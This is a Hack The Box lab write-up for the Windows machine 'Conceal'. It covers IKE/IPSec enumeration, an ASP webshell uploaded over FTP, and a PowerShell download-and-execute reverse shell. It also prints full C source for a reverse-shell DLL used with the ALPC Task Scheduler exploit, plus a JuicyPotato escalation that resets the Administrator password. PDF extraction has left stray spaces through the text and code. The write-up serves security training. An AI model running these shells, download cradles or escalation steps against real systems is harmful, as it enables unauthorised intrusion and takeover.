@@ -1,0 +1,358 @@
+Conceal
+
+08t h May 2019 / Document No D19.100.20
+
+Prepared By: MinatoTW
+Machine Author: bashlogic
+Difficulty: H ard
+Classification: Official
+
+                                                                        Page 1 / 18
+SYNOPSIS
+
+Conceal is a "hard" difficulty Windows which teaches enumeration of IKE protocol and
+configuring IPSec in transport mode. Once configured and working the firewall goes down and a
+shell can be uploaded via FTP and executed. On listing the hotfixes the box is found vulnerable
+to ALPC Task Scheduler LPE. Alternatively, SeImpersonatePrivilege granted to the user allows to
+obtain a SYSTEM shell.
+
+Skills Required           Skills Learned
+
+     Networking                IKE Configuration
+     Windows Enumeration
+
+                                                  Page 2 / 18
+ENUMERATION
+NMAP
+
+TCP Full Port Scan
+ nmap -p- -T4 --min-rate=1000 10.10.10.116
+After completion we find no ports open on TCP. Let's do a UDP Scan.
+ nmap -sU -T4 -p1-1000 -sC -sV 10.10.10.116
+
+We find port 500 to be open, which on doing a script scan appears to be running IKE.
+
+IKE stands for Internet Key Exchange which is used to establish a secure connection in the IPSec
+protocol. More on it h ere.
+
+                                                                                                                  Page 3 / 18
+IKESCAN
+
+In order to configure the VPN we'll need the various parameters associated with it like the
+encryption algorithms, protocol, pre-shared key etc.
+
+To do this we'll use a utility ike-scan.
+ apt install ike-scan
+ ike-scan 10.10.10.116
+
+$ ike-scan 10.10.10.116
+Starting ike-scan 1.9.4 with 1 hosts
+(http://www.nta-monitor.com/tools/ike-scan/)
+
+10.10.10.116  Main Mode Handshake returned HDR=(CKY-R=ee3af26a40c2eaa8)
+
+SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds
+
+LifeDuration(4)=0x00007080) VID=1e2b516905991c7d7c96fcbfb587e46100000009
+
+(Windows-8) VID=4a131c81070358455c5728f20e95452f (RFC 3947 NAT-T)
+
+VID=90cb80913ebb696e086381b5ec427b1f (draft-ietf-ipsec-nat-t-ike-02\n)
+
+VID=4048b7d56ebce88525e7de7f00d6c2d3 (IKE Fragmentation)
+
+VID=fb1de3cdf341b7ea16b7e5be0855f120 (MS-Negotiation Discovery Capable)
+
+VID=e3a5966a76379fe707228231e5ce8652 (IKE CGA version 1)
+
+ Ending ike-scan 1.9.4: 1 hosts scanned i n 0.358 seconds (2.79 hosts/sec).
+ 1 returned handshake; 0 returned notify
+
+We obtain some information like Encryption type 3DES, SHA1 hash algorithm and the IKE Version
+being v1 among others. Another thing to be noted is the Auth parameter which needs a PSK
+(Pre-shared Key)
+
+                                                                   Page 4 / 18
+SNMPWALK
+
+To enumerate the network information further we can use snmpwalk.
+
+The string "IKE VPN password PSK - 9C8B1A372B1878851BE2C097031B6E43" is obtained. The
+password is 32 characters long which could be an md5 hash or NTLM hash.
+
+Trying it on Hashkiller cracks it as an NTLM hash.
+
+The cracked PSK is Dudecake1!
+
+STRONGSWAN CONFIGURATION
+
+To establish a connection we'll use strongswan which allows use to configure ipsec.
+ apt install -y strongswan
+
+                                                                                                                  Page 5 / 18
+As we know the PSK already we can configure it in /etc/ipsec.secrets.
+
+ echo '10.10.10.116 : PSK "Dudecake1!"' >> /etc/ipsec.secrets
+
+It's in the format source destination : PSK , as the source is always us we can ignore it.
+
+Next open up /etc/ipsec.conf in order to configure the connection and it's parameters. The
+strongswan documentation consists of the list of parameters available. The minimal configuration
+looks like this.
+
+ conn Conceal
+           type= transport
+           keyexchange=ikev1
+           right=10.10.10.116
+           authby=psk
+           rightprotoport=tcp
+           leftprotoport=tcp
+           esp=3des-sha1
+           ike=3des-sha1-modp1024
+           auto=start
+
+We define a connection named Conceal. The type of connection is just transport as we are only
+encrypting the traffic and not creating a tunnel. The keyexchange parameter is used to specify
+the version of protocol to be used which be obtained earlier as v1. The right parameter is used to
+specify the destination host. The authby parameter will be psk obtained from ikescan. We
+assume the protocol to be TCP, in case it doesn't work it'll be switched with UDP. It is specified
+using the protoport parameters. The esp parameter specifies the cipher suites in the format
+encryption-hashing. The ike parameter is the same but we need to specify even the group which
+is modp1024.
+
+ Ipsec stop
+ Ipsec start --nofork
+
+We stop the ipsec service to kill all related processes and start it in nofork mode in order to
+debug it.
+
+                                                                                                                  Page 6 / 18
+The message "Conceal established...." confirms that the connection was successful.
+
+NMAP
+
+Running nmap again after successful connection lets us bypass the firewall and discover ports.
+We need to use -sT for a full connect scan.
+ ports=$(nmap -p- --min-rate=1000 -sT -T4 10.10.10.116 | grep ^[0-9] | cut
+ -d ' /' -f 1 | tr '\n' ' ,' | sed s/,$//)
+ nmap -sC -sV -p$ports -sT 10.10.10.116
+
+Now the ports are open like any normal windows box. IIS is running on port 80 and FTP has
+anonymous login enabled.
+
+                                                                                                                  Page 7 / 18
+IIS - PORT 80
+
+The page hosts a standard IIS Installation.
+
+GOBUSTER
+
+Running gobuster found an interesting folder which could be linked to FTP.
+
+                                                                                                                  Page 8 / 18
+FTP
+
+FTP has anonymous login enabled. After logging in we land in an empty directory. To test if the
+/upload directory is linked to FTP we upload a test file.
+
+And then to verify,
+ curl http://10.10.10.116/upload/exist.asp
+
+Having verified this we can drop a shell and execute it.
+
+                                                          Page 9 / 18
+FOOTHOLD
+
+We can execute system commands with asp scripts. We'll use this simple cmd.asp webshell here.
+ wget
+ https://raw.githubusercontent.com/tennc/webshell/master/asp/webshell.asp -O
+ cmd.asp
+ ftp 10.10.10.116 # put cmd.asp
+
+Now we can navigate to http://10.10.10.116/upload/cmd.asp to execute commands.
+
+                                                                                                                 Page 10 / 18
+EXECUTING SHELL
+
+We'll use the TCP Reverse Shell from N ishang.
+ wget
+ https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-
+ PowerShellTcp.ps1
+ echo ' Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.2 -Port 443' >>
+ Invoke-PowerShellTcp.ps1
+ python3 -m http.server 80
+Add the reverse shell command to the end of the script. Start the http server and execute.
+ Powershell -c iex(new-object
+ net.webclient).downloadstring(' http://10.10.14.2/Invoke-PowerShellTcp.ps1')
+And we receive a shell as the user Destitute.
+
+                                                                                                                 Page 11 / 18
+PRIVILEGE ESCALATION
+ENUMERATION
+
+While running systeminfo we find the version to be WIndows 10 Enterprise Build 15063 and in the
+HotFix section we see that nothing was patched.
+
+The box could be potentially vulnerable to ALPC Task Scheduler LPE C VE-2018-8440. One
+important condition for the exploit to work is the Read Execute access for Authenticated Users
+group on the C:\Windows\Tasks folder.
+ icacls C:\Windows\Tasks
+
+                                                                                                                 Page 12 / 18
+ALPC SCHEDULER LPE
+
+Having confirmed the vulnerability we can now exploit it.
+
+We'll use the ALPC DiagHub exploit - https://github.com/realoriginal/alpc-diaghub whch
+combines the ALPC exploit with DiagHub Service to execute the DLL. More information on
+DiagHub here.
+
+Download the 64 bit version and then compile a DLL using mingw. Here's a sample code which
+sends a reverse shell using sockets on windows. It creates a socket, sends back a connect, runs
+the command and stores in a buffer to return the output. For a detailed explanation check this
+link.
+ #include < winsock2.h>
+ #include <windows.h>
+ #include <stdio.h>
+ #include <ws2tcpip.h>
+
+ #pragma comment(lib, "Ws2_32.lib")
+ #define DEFAULT_BUFLEN 1024
+
+ void r evShell();
+
+ BOOL WINAPI D llMain(HINSTANCE hinstDll, DWORD dwReason, LPVOID lpReserved)
+ {
+
+           switch(dwReason)
+                     {
+                               c ase DLL_PROCESS_ATTACH:
+                                                   revShell();
+                                                   b reak;
+
+                               case DLL_PROCESS_DETACH:
+                                                   break;
+
+                               case DLL_THREAD_ATTACH:
+                                                   break;
+
+                               case DLL_THREAD_DETACH:
+                                                   break;
+
+                                                                                                                 Page 13 / 18
+                   }
+                   return 0;
+}
+
+void revShell( ) {            // 1000 = One Second
+         Sleep(1000);
+
+         SOCKET mySocket;
+         sockaddr_in addr;
+         WSADATA version;
+         WSAStartup(MAKEWORD(2, 2) , &version);
+         mySocket = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP, N ULL, (u nsigned
+int)N ULL, (u nsigned i nt) N ULL) ;
+         addr.sin_family = AF_INET;
+         addr.sin_addr.s_addr = inet_addr("10.10.14.2") ; / / Change IP
+         addr.sin_port = htons(4444); //Change port
+         //Connecting to Proxy/ProxyIP/C2Host
+         if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof( addr), NULL, N ULL,
+NULL, NULL) ==SOCKET_ERROR) {
+
+                   closesocket(mySocket);
+                   WSACleanup();
+         }
+         else {
+                   char RecvData[DEFAULT_BUFLEN];
+                   memset( RecvData, 0, sizeof(RecvData));
+                   int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0) ;
+                   if (RecvCode <= 0) {
+
+                             closesocket(mySocket);
+                             WSACleanup();
+                   }
+                   else {
+                             char Process[] = " cmd.exe";
+                             STARTUPINFO sinfo;
+                             PROCESS_INFORMATION pinfo;
+                             memset(&sinfo, 0 , s izeof(sinfo));
+                             sinfo.cb = sizeof( sinfo);
+
+                                                    Page 14 / 18
+                               sinfo.dwFlags = (STARTF_USESTDHANDLES |
+ STARTF_USESHOWWINDOW);
+
+                               sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError =
+ (HANDLE) mySocket;
+
+                               CreateProcess(N ULL, Process, NULL, N ULL, TRUE, 0, NULL,
+ NULL, &sinfo, &pinfo);
+
+                               WaitForSingleObject(pinfo.hProcess, INFINITE);
+                               CloseHandle(pinfo.hProcess);
+                               CloseHandle(pinfo.hThread);
+
+                               memset( RecvData, 0 , sizeof(RecvData));
+                               int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN,
+ 0);
+
+                               if (RecvCode <= 0 ) {
+                               closesocket(mySocket);
+                               WSACleanup();
+                               }
+                               if (s trcmp( RecvData, "exit\n") == 0) {
+                               exit(0 ) ;
+                               }
+                     }
+           }
+
+ }
+
+Change the IP and port and then compile the DLL.
+ apt install mingw-w64
+ x86_64-w64-mingw32-g++ payload.cpp -o payload.dll -lws2_32 -shared
+
+Transfer the DLL and the binary to the box via wget. Then execute,
+ cmd /c alpc.exe payload.dll .\htb.rtf
+
+The process should just hang.
+
+                                                                                                                 Page 15 / 18
+But on the other side we receive a SYSTEM shell!
+
+ALTERNATIVE PRIVESC
+JUICY POTATO
+
+Looking at the privileges of the user we notice that SeImpersonate is enabled.
+
+As BITS is disabled we can't use rotten or lonely potato. However, juicy potato can make use of
+other COM server and any port other than 6666. Download the binary from the releases,
+
+                                                                                                                 Page 16 / 18
+ wget
+ https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
+Create a bat script with contents,
+ whoami /all > C:\Users\Public\proof.txt
+Transfer both the script and exe to the box. Now we need valid CLSID to exploit it. There's a list
+of CLSIDs for Windows 10 Enterprise h ere, out of which we can choose one which gives "NT
+AUTHORITY\SYSTEM".
+
+Run the binary with required arguments,
+ .\juicypotato.exe -t * -p C:\Users\Destitute\root.bat -l 9001 -c
+ {A9B5F443-FE02-4C19-859D-E9B5C5A1B6C6}
+
+Now verifying the proof.txt we find the details for SYSTEM.
+
+Similarly, we create another bat file to change Administrator password.
+ net user Administrator abc123!
+
+                                                                         Page 17 / 18
+Run the command,
+ cmd /c " .\juicypotato.exe -t * -p C:\Users\Destitute\root.bat -l 9001 -c
+ {A9B5F443-FE02-4C19-859D-E9B5C5A1B6C6}"
+Once the command succeeds we can use psexec to get a shell as SYSTEM.
+ psexec.py administrator@10.10.10.116 # password: abc123!
+
+                                                                                                                 Page 18 / 18
+
